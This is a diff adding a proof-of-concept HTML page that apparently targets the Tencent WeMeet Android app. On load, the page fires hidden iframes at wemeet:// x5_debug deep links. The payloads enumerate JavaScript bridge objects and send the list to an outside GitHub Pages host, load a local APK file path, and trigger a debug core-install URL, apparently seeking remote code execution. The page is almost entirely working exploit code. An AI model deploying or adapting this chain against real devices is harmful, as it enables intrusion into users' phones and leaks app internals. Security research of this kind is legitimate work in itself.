@@ -1,0 +1,26 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P20</h1>
+<script>
+document.title='P20L-START';
+var dump='javascript:void((function(){var k=[];try{for(var i in window){if(/js|native|bridge|android|tbs|x5|java|wemeet|prompt|file/i.test(i))k.push(i);}}catch(e){}location.replace("https://gitwhs.github.io/wm-poc-rce/probe20cb.html?if="+encodeURIComponent(k.join(",")||"none"));})())';
+var fileu='file:///data/user/0/com.tencent.wemeet.app/app_debugtbs/plugin/DebugPlugin.apk';
+var tbs='https://debugtbs.qq.com?func=installlocal_core';
+var schemes=[
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(dump),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(fileu),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(tbs)
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P20L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P20L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 4500);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
